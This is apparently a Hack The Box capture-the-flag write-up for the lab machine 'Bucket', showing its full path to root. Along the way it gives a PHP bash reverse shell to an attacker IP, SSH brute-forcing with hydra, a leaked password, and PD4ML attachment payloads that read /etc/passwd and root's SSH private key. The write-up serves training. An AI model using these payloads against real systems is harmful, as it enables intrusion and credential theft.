@@ -1,0 +1,315 @@
+Bucket
+
+23th April 2021 / Document No D21.100.115
+Prepared By: felamos
+Machine Creator(s): MrR3boot
+Difficulty: Medium
+Classification: Official
+Synopsis
+
+Bucket is a medium difficulty Linux machine that features LocalStack which simulates a local AWS
+environment. Web application is running on Apache server and the files are hosted on an open
+S3 bucket which allows us dropping a malicious PHP file and thus gain a reverse shell. At user's
+home directory we can find an unfinished project which utilizes DynamoDB for database.
+Enumerating DynamoDB reveals credentials which can be reused to move laterally. An internal
+application found to be running as root, which is exploited to gain root access.
+
+Skills Required
+
+      Enumeration
+      Basic Knowledge of Linux
+
+Skills Learned
+
+      S3
+      DynamoDB
+      PD4ML Exploitation
+Enumeration
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.212 | grep ^[0-9] | cut -d '/' -f
+   1 | tr '\n' ',' | sed s/,$//)
+   nmap -p$ports -sV -sC 10.10.10.212
+
+Nmap output reveals that the target server has ports 22 (OpenSSH) and 80 (Apache httpd) open.
+
+Apache
+
+Let's browse to port 80.
+Apache service is redirecting us to bucket.htb domain. Let's add below entry to resolve the
+domain to the server IP address.
+
+   echo "10.10.10.212 bucket.htb" >> /etc/hosts
+We can now browse to http://bucket.htb .
+
+This domain is hosting an advertising platform application but images of the application fail to
+load. Lets view the page source.
+
+The images of the application are loading from the adserver folder of a subdomain of
+bucket.htb . Lets add this as well to our hosts file.
+
+   echo "10.10.10.212 s3.bucket.htb" >> /etc/hosts
+After refreshing the page, we see that the images are properly loading.
+Foothold
+
+We can now browse to the subdomain.
+   curl http://s3.bucket.htb/ | jq
+
+It returns a JSON object with the status of running. This look like a generic API response and we
+can check the response headers.
+
+   curl -v http://s3.bucket.htb/ | jq
+
+This reveals some interesting headers. Let's search online for x-amz-version-id header.
+S3
+
+We see that this header is related to AWS Simple Storage Service (S3). Its an object storage
+offering service which is specifically used for storing static files for a website or to have other
+documents.
+The URL format for S3 services in general is as below:
+
+        https://[bucketname].s3.domainname.com
+        https://s3-[region].domainname.com/[bucketname]
+From this knowledge, we now aware that adserver folder path is a bucket name. We can use
+aws command line tool to enumerate the files and folders inside a S3 bucket. We are going to
+install the tool by issuing the following command.
+   sudo apt install awscli
+By default AWS cli tool interacts with s3.amazonaws.com . Since we have another domain hosting
+it, we can use --endpoint-url option to point the tool to another domain.
+   aws --endpoint-url=http://s3.bucket.htb s3 ls
+
+AWS cli tool looks for ~/.aws/credentials file to locate the keys in order to authenticate to the
+cloud services. Unfortunately we do not have any valid keys to authenticate with the service. Since
+its a custom implementation of AWS services, we can use any random credentials to authenticate.
+Let's configure the keys.
+We can now list the contents inside S3 bucket.
+   aws --endpoint-url=http://s3.bucket.htb s3 ls
+
+We find that adserver bucket is present. Let's list all contents inside this bucket.
+   aws --endpoint-url=http://s3.bucket.htb s3 ls s3://adserver
+
+It is possible to download the files by issuing the fellow command.
+   aws --endpoint-url=http://s3.bucket.htb s3 sync s3://adserver .
+By looking at the contents of index.html file we find out that these files are served by the
+Apache server. We can upload a sample PHP file to the S3 bucket to test if PHP is indeed installed.
+
+   echo '<?php phpinfo();?>' > test.php
+   aws --endpoint-url=http://s3.bucket.htb s3 cp test.php s3://adserver
+After a minute or so we see that the file is present.
+
+We also notice that PHP is installed on the Apache server. We can execute the below commands
+to upload another PHP file with code that can return a reverse shell.
+
+   echo "<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/10.10.14.3/4444 0>&1 \"');
+   ?>" > shell.php
+   aws --endpoint-url=http://s3.bucket.htb s3 cp shell.php s3://adserver/
+
+Let's standup a listener on port 4444 and browse to http://bucket.htb/shell.php .
+This is successful and it was possible to get a reverse shell as www-data on the server. We now
+have to issue the below commands to obtain though a stable and interactive shell.
+
+   python3 -c 'import pty;pty.spawn("/bin/bash");'
+   CRTL + Z
+   stty raw -echo
+Lateral Movement
+
+By having foothold on the server, we can enumerate the filesystem. We observe bucket-app
+folder in /var/www directory. Let's further enumerate it.
+By checking the folder permissions we notice that it has an Access Control List (ACL) set.
+
+ACL's can be enumerated using getfacl utility.
+
+It seems that only roy and root users have permissions to this folder.
+It is also possible to access the project folder.
+There we locate a PHP file that we can view it's content.
+
+DynamoDB
+DynamoDB
+
+It seems that the project is still under development. The code is trying to connect to the
+DynamoDB service using an endpoint url. DynamoDB is a NoSQL database service that supports
+key-value and document data structures.
+Let's configure the credentials for this user.
+
+   mkdir /tmp/f
+   export HOME=/tmp/f
+   aws configure
+
+It is now possible to list all tables from DynamoDB.
+   aws --endpoint-url=http://localhost:4566 dynamodb list-tables
+
+There is a users table. Let's view its contents.
+   aws --endpoint-url=http://localhost:4566 dynamodb scan --table-name users
+We spot three credentials present. We try to reuse those credentials in order to switch to user
+roy . The password n2vM-<_K_Q:.Aa2 works.
+Alternate Method
+
+FFUF
+
+We can enumerate files and folders from both domains.
+   ffuf -u http://bucket.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt
+   ffuf -u http://s3.bucket.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt
+
+The ffuf identified two interesting paths and we browse to /health .
+DynamoDB
+
+We see that there are two services running on the target server. Let's also browse to /shell .
+
+We notice that it redirects to another hostname and to a different port. The port is not open
+externally and it also redirects to shell/ . We visit the /shell/ directory.
+
+This hosts a DynamoDB JavaScript Shell. DynamoDB is a NoSQL database service that supports
+key-value and document data structures. We can refer  the AWS documentation to learn how to
+enumerate information from DynamoDB using JavaScript. It is possible to list the tables using
+below JavaScript code.
+
+var params = {
+
+};
+
+dynamodb.listTables(params, function(err, data) {
+
+    if (err) console.log(err, err.stack); // an error occurred
+
+    else  console.log(data);  // successful response
+
+});
+We observe that the users table is present and we can view the contents inside this table.
+
+var params = {
+
+TableName: "users"
+
+};
+
+dynamodb.scan(params, function(err, data) {
+
+     if (err) console.log(err, err.stack); // an error occurred
+
+     else  console.log(data); // successful response
+
+});
+
+We notice also three sets of credentials present in the table. It is worth spraying them on the SSH
+service. We issue the below command to bruteforce the SSH service.
+
+   hydra -L users.txt -P passwords.txt ssh://10.10.10.212
+Unfortunately our attack didn't work. It could be due to the fact that users are not present on the
+server. We can try to bruteforce again by using a list of usernames from known wordlists.
+
+   hydra -L /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-
+   usernames.txt -P passwords.txt ssh://10.10.10.212
+
+Using tool hydra we are able to spot valid credentials and then login as user roy to SSH.
+Privilege Escalation
+
+It is now possible to access the bucket-app folder.
+   ls -la /var/www/bucket-app
+
+By exploring the Apache configuration files we found out that this application is running as root
+user. Thus it is worth further enumerating the application.
+
+This application is listening locally on port 8000. We can perform a port forward using SSH to
+access the application.
+
+   ssh -L 8000:127.0.0.1:8000 roy@bucket.htb
+Now application can be accessed by browsing to port localhost:8000 in our machine.
+PD4ML
+
+We can perform a code review at index.php file.
+   <?php
+
+   require 'vendor/autoload.php';
+   use Aws\DynamoDb\DynamoDbClient;
+   if($_SERVER["REQUEST_METHOD"]==="POST") {
+
+                 if($_POST["action"]==="get_alerts") {
+                                date_default_timezone_set('America/New_York');
+                                $client = new DynamoDbClient([
+                                              'profile' => 'default',
+                                              'region' => 'us-east-1',
+                                           'version' => 'latest',
+                                              'endpoint' => 'http://localhost:4566'
+                                ]);
+                                $iterator = $client->getIterator('Scan', array(
+                                       'TableName' => 'alerts',
+                                       'FilterExpression' => "title = :title",
+                                       'ExpressionAttributeValues' =>
+   array(":title"=>array("S"=>"Ransomware")),
+                                ));
+                                foreach ($iterator as $item) {
+                                       $name=rand(1,10000).'.html';
+
+                                       file_put_contents('files/'.$name,$item["data"]);
+
+                                }
+                         passthru("java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar
+   Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf");
+                 }
+   }
+   else
+   {
+   ?>
+
+The above code connects to DynamoDB service and performs a scan of the alerts table. It then
+filters the content based on title . If there's a key that contains Ransomware title then it writes
+its data value to a random html file inside files folder. Using the PD4ML utility it converts the
+HTML contents to a PDF file. By checking the list of tables, we observe that there's no alerts
+table present in the DynamoDB database.
+
+Let's configure the AWS credentials and create the table by issuing the following command.
+
+   aws --endpoint-url=http://localhost:4566 dynamodb create-table --table-name
+   alerts --attribute-definitions AttributeName=title,AttributeType=S
+   AttributeName=data,AttributeType=S --key-schema
+   AttributeName=title,KeyType=HASH AttributeName=data,KeyType=RANGE --
+   provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5
+
+This creates a table called alerts with two attributes title and data . As application filters the
+contents based on Ransomware title, it is possible to insert a record with a sample HTML code.
+
+   aws --endpoint-url=http://localhost:4566 dynamodb put-item --table-name alerts
+   --item '{"title":{"S":"Ransomware"},"data":{"S":"<html><h1>test</h1></html>"}}'
+We send a POST request with action of get_alerts to trigger the HTML conversion.
+   curl http://localhost:8000/index.php -d 'action=get_alerts'
+
+This generates two files in the files directory.
+
+Now lets navigate to http://localhost:8000/files/result.pdf in order to download the PDF
+file.
+
+   wget http://localhost:8000/files/result.pdf
+
+We see that the PDF is indeed created with HTML that we provided in the database. Checking the
+supported HTML tags for pd4ml reveals that we can also embed an external resource as PDF
+attachment using the attachment tag.
+   <pd4ml:attachment src="http://pd4ml.com/i/logo.png" description="test"
+   icon="Paperclip"/>
+Let's verify this by attaching /etc/passwd file to the PDF.
+   <html><pd4ml:attachment src="file:///etc/passwd" description="test"
+   icon="Paperclip"/></html>
+   aws --endpoint-url=http://localhost:4566 dynamodb put-item --table-name alerts
+   --item '{"title":{"S":"Ransomware"},"data":{"S":"<html><pd4ml:attachment
+   src='\''file:///etc/passwd'\'' description='\''test'\''
+   icon='\''Paperclip'\''/></html>"}}'
+We can now send POST request to generate the new PDF. Let's save the PDF and click on the
+attachment.
+
+The attack is successful and we can view the contents of /etc/passwd . It is also possible to list
+the contents of directories with this vulnerability. Let's try to view the files inside /root directory.
+
+   aws --endpoint-url=http://localhost:4566 dynamodb put-item --table-name alerts
+   --item '{"title":{"S":"Ransomware"},"data":{"S":"<html><pd4ml:attachment
+   src='\''file:///root/'\'' description='\''test'\'' icon='\''Paperclip'\''/>
+   </html>"}}'
+The .ssh folder is present. It is worth try to capture the id_rsa file from this folder.
+   aws --endpoint-url=http://localhost:4566 dynamodb put-item --table-name alerts
+   --item '{"title":{"S":"Ransomware"},"data":{"S":"<html><pd4ml:attachment
+   src='\''file:///root/.ssh/id_rsa'\'' description='\''test'\''
+   icon='\''Paperclip'\''/></html>"}}'
+
+We copy the SSH private key and by issuing the following commands it is possible to obtain the
+root shell.
+
+   chmod 600 id_rsa
+   ssh -i id_rsa root@bucket.htb
+
